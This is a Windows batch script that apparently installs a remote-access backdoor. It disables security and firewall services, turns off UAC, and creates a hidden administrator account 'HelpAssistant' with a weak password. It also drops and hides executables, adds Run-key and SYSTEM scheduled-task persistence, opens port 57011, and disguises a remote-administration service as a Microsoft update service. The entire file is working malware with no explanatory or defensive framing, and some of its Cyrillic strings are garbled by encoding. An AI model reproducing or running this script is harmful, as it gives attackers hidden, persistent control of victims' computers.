@echo off

if exist c:\users\nul (goto win7) else goto winxp

:win7
ping -n 5 127.0.0.1
start %temp%\poc.exe
ping -n 5 127.0.0.1
goto install

:winxp
net stop Alerter
sc config Alerter start= disabled
net stop wscsvc
sc config wscsvc start= disabled
net stop SharedAccess
sc config SharedAccess start= disabled
sc config TlntSvr start= auto
net start TlntSvr

:install
copy /y "%temp%\ip.exe" "%SYSTEMROOT%/ip.exe"
copy /y "%temp%\cam_server.exe" "%SystemRoot%\cam_server.exe"

reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v HelpAssistant /t REG_DWORD /d 0 /f
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "cam_server.exe" /t REG_SZ /d "%SystemRoot%\cam_server.exe pass=╧рЁюы№ port=57011" /f

attrib +s +h +r "%SYSTEMROOT%/ip.exe"
attrib +s +h +r "%SYSTEMROOT%/cam_server.exe"

netsh advfirewall firewall add rule name="RealIP" dir=in program="%SYSTEMROOT%\realip.exe" security=notrequired action=allow
netsh advfirewall firewall add rule name="Microsoft Outlook Express" dir=in program="%SYSTEMROOT%\blat.exe" security=notrequired action=allow
netsh firewall add portopening tcp 57011 all

net user HelpAssistant admin /add
net localgroup Адми*истр*торы HelpAssistant /add
net user HelpAssistant /active:yes /comment:"Учет**я з*пись для предост*вле*ия помощи" /passwordchg:yes
net user HelpAssistant admin

%temp%\msupdate.msi /qn /norestart

start %temp%\ip.exe

ping -n 5 127.0.0.1

attrib +S +H %windir%\system32\rserver30

schtasks /create /tn "security" /sc minute /mo 40 /ru "NT AUTHORITY\SYSTEM" /tr "%SYSTEMROOT%/ip.exe /f

cd %SystemRoot%\


net stop rserver3
reg add "HKLM\System\CurrentControlSet\Services\RServer3" /v "DisplayName" /d "Microsoft Update Provide" /f
reg add "HKLM\System\CurrentControlSet\Services\RServer3" /v "Description" /d "Update your Windows operation system and check corruption files" /f
net start rserver3